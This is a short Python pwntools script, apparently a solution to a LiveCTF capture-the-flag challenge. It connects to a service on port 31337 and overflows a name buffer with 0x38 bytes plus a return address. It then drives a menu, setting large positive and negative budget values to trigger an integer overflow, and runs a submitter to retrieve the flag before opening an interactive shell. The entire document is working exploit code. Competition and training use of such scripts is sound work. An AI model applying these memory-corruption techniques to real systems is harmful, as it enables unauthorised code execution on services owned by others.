#!/usr/bin/env python3

from pwn import *
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

def E(x):
    if type(x) is str:
        return x.encode()
    return x
sla = lambda a,b: io.sendlineafter(E(a),E(b))
tgt=p64(0x4015EA)
sla('name',b'a'*0x38+tgt)
sla('Choice: ','d')
sla('Choice: ','h')
sla('name','a')
sla('Choice: ','x')

sla('Choice: ','a')
sla('Choice: ','c')
sla('name','b')
sla('budget','1')
sla('Region','1')
sla('Choice: ','0')
sla('ID','1')
for _ in range(5):
    sla('Keyword','av')

sla('Choice: ','e')
sla('Which','1')
sla('budget','-2100000000')
sla('Would','n')
sla('Would','n')

sla('Choice: ','e')
sla('Which','1')
sla('budget','2100000000')
sla('Would','n')
sla('Would','n')

sla('Choice: ','p')
sla('Which','1')

sla('Choice: ','x')
sla('Choice: ','n')
io.sendline("./submitter")
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
io.interactive()